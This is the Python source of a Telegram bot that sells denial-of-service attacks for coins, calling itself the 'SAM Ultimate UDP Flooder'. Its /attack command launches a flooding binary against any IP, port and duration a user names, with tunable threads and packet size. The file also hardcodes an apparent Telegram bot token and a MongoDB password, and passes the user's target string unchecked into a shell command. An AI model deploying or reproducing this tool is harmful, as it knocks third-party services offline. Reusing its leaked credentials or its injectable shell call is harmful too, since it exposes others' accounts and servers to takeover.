import asyncio
from datetime import datetime, timedelta
from collections import defaultdict
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

bot_start_time = datetime.now()
attack_in_progress = False
current_attack = None  # Store details of the current attack
attack_history = []  # Store attack logs

TELEGRAM_BOT_TOKEN = '7179492458:AAFX-GmG9ojRbWyTCDuyAtzDcQE8Io0H7-c'
ADMIN_USER_ID = 1291795330
MONGO_URI = "mongodb+srv://VIP:7OMbiO6JV74CFy0I@cluster0.rezah.mongodb.net/VipDatabase?retryWrites=true&w=majority&appName=Cluster0"
DB_NAME = "known"
COLLECTION_NAME = "users"
attack_in_progress = False
ATTACK_TIME_LIMIT = 300  # Maximum attack duration in seconds
COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
ATTACK_COOLDOWN = 300  # Cooldown period in seconds (5 minutes)


threads = 1000
packet_size = 24

# Global variables for managing cooldowns
last_attack_time = defaultdict(lambda: datetime.min)

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

async def get_user(user_id):
    """Fetch user data from MongoDB."""
    user = await users_collection.find_one({"user_id": user_id})
    if not user:
        return {"user_id": user_id, "coins": 0}
    return user

async def update_user(user_id, coins):
    """Update user coins in MongoDB."""
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🎉 Welcome to the SAM Ultimate UDP Flooder! 🎉*\n\n"
        "*🔥 Experience the pinnacle of hacking with our advanced features! 🔥*\n\n"
        "*✨ Key Features: ✨*\n"
        "🚀 *Initiate attacks on your opponents using /attack*\n"
        "🏦 *Check your account balance and approval status with /myinfo*\n"
        "🤖 *Become the ultimate hacker!*\n\n"
        "*⚠️ How to Use: ⚠️*\n"
        "*Utilize the commands and type /help for a complete list of commands.*\n\n"
        "*💬 Queries or Issues? 💬*\n"
        "*Contact Admin: @Baap_hu_ter4*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def harshu(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*🚫 Access Denied! Please contact the admin for assistance.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Incorrect usage! Use: /harshu <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return

    command, target_user_id, coins = args
    coins = int(coins)
    target_user_id = int(target_user_id)

    user = await get_user(target_user_id)

    if command == 'add':
        new_balance = user["coins"] + coins
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Added {coins} coins to user {target_user_id}. New balance: {new_balance}.*", parse_mode='Markdown')
    elif command == 'rem':
        new_balance = max(0, user["coins"] - coins)
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Removed {coins} coins from user {target_user_id}. New balance: {new_balance}.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time, bot_start_time, last_attack_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    # Check if the user is on cooldown (excluding admin)
    if user_id != ADMIN_USER_ID:
        now = datetime.now()
        elapsed_time = (now - last_attack_time[user_id]).total_seconds()
        if elapsed_time < ATTACK_COOLDOWN:
            remaining_cooldown = int(ATTACK_COOLDOWN - elapsed_time)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ Cooldown in effect! Please wait {remaining_cooldown} seconds before initiating another attack.*",
                parse_mode='Markdown'
            )
            return

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*💰 Insufficient coins! Please contact the admin to acquire more coins. DM: @TREXVIVEK*",
            parse_mode='Markdown'
        )
        return

    if attack_in_progress:
        remaining_time = (attack_end_time - datetime.now()).total_seconds()
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ An attack is already in progress. Please wait {int(remaining_time)} seconds for it to complete.*",
            parse_mode='Markdown'
        )
        return

    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*❌ Incorrect usage! The correct format is:*\n"
                "*👉 /attack <ip> <port> <duration>*\n"
                "*📌 Example: /attack 192.168.1.1 26547 180*"
            ),
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args
    port = int(port)
    duration = int(duration)

    # Check for restricted ports
    restricted_ports = [17500, 20000, 20001, 20002]
    if port in restricted_ports or (100 <= port <= 999):
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ Invalid port! Please enter a correct port number.*",
            parse_mode='Markdown'
        )
        return

    if duration > ATTACK_TIME_LIMIT:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*⛔ Duration limit exceeded! You can only attack for up to {ATTACK_TIME_LIMIT} seconds.*\n"
                "*For extended duration, please contact the admin! 😎*"
            ),
            parse_mode='Markdown'
        )
        return

    # Deduct coins
    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
    await update_user(user_id, new_balance)

    attack_in_progress = True
    attack_end_time = datetime.now() + timedelta(seconds=duration)
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            "*🚀 [ATTACK INITIATED] 🚀*\n\n"
            f"*💣 Target IP: {ip}*\n"
            f"*🔢 Port: {port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*💰 Coins Deducted: {COINS_REQUIRED_PER_ATTACK}*\n"
            f"*📉 Remaining Balance: {new_balance}*\n\n"
            "*🔥 The attack is in progress! Sit back and enjoy! 💥*"
        ),
        parse_mode='Markdown'
    )

    # Update last attack time for the user
    last_attack_time[user_id] = datetime.now()

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_end_time, packet_size, threads
    attack_in_progress = True

    try:
        command = f"./bgmi {ip} {port} {duration} {packet_size} {threads}"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Error: {str(e)}*\n*Command failed to execute. Please contact the admin if needed.*",
            parse_mode='Markdown'
        )

    finally:
        attack_in_progress = False
        attack_end_time = None
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*✅ [ATTACK FINISHED] ✅*\n\n"
                f"*💣 Target IP: {ip}*\n"
                f"*🔢 Port: {port}*\n"
                f"*🕒 Duration: {duration} seconds*\n\n"
                "*💥 Attack complete! Please provide feedback! 🚀*"
            ),
            parse_mode='Markdown'
        )

async def uptime(update: Update, context: CallbackContext):
    elapsed_time = (datetime.now() - bot_start_time).total_seconds()
    minutes, seconds = divmod(int(elapsed_time), 60)
    await context.bot.send_message(update.effective_chat.id, text=f"*⏰ Bot uptime: {minutes} minutes, {seconds} seconds*", parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    user = await get_user(user_id)

    balance = user["coins"]
    message = (
        f"*📝 Here is your information:*\n"
        f"*💰 Coins: {balance}*\n"
        f"*😏 Status: Approved*\n"
        f"*Keep up the good work, aspiring hacker!*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🛠️ SAM VIP DDOS Bot Help Menu 🛠️*\n\n"
        "🌟 *Find everything you need here!* 🌟\n\n"
        "📜 *Available Commands:* 📜\n\n"
        "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
        "   - *Use this command to launch an attack.*\n"
        "   - *Example: /attack 192.168.1.1 20876 180*\n"
        "   - *📝 Note: Duration cannot exceed 180 seconds.*\n\n"
        "2️⃣ *💳 /myinfo*\n"
        "   - *Check your account status and coin balance.*\n"
        "   - *Example: Get detailed information about your balance and approval status.*\n\n"
        "3️⃣ *🔧 /uptime*\n"
        "   - *Check the bot's uptime and see how long it's been running.*\n\n"
        "4️⃣ *❓ /help*\n"
        "   - *You're already using this command! It explains all the bot's features.*\n\n"
        "🚨 *Important Tips:* 🚨\n"
        "- *If the bot doesn't reply, it means another user is attacking. Please wait.*\n"
        "- *If you encounter any issues, contact the admin: @Baap_hu_ter4*\n\n"
        "💥 *Now go and start your hacking adventures!* 💥"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_coins(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add_coins <amount>*", parse_mode='Markdown')
        return

    try:
        coins_to_add = int(args[0])
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Coins must be a number.*", parse_mode='Markdown')
        return

    user = await get_user(user_id)
    new_balance = user["coins"] + coins_to_add
    await update_user(user_id, new_balance)

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ {coins_to_add} coins added to your account. New balance: {new_balance}.*", parse_mode='Markdown')

async def set_attack_parameters(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /setparams <packet_size> <threads>*", parse_mode='Markdown')
        return

    try:
        new_packet_size = int(args[0])
        new_threads = int(args[1])
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Both packet_size and threads must be numbers.*", parse_mode='Markdown')
        return

    global packet_size, threads
    packet_size = new_packet_size
    threads = new_threads

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Parameters updated: packet_size={packet_size}, threads={threads}.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("harshu", harshu))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(CommandHandler("add_coins", add_coins))  # New command handler
    application.add_handler(CommandHandler("setparams", set_attack_parameters))  # New command handler for setting parameters
    application.run_polling()

if __name__ == '__main__':
    main()
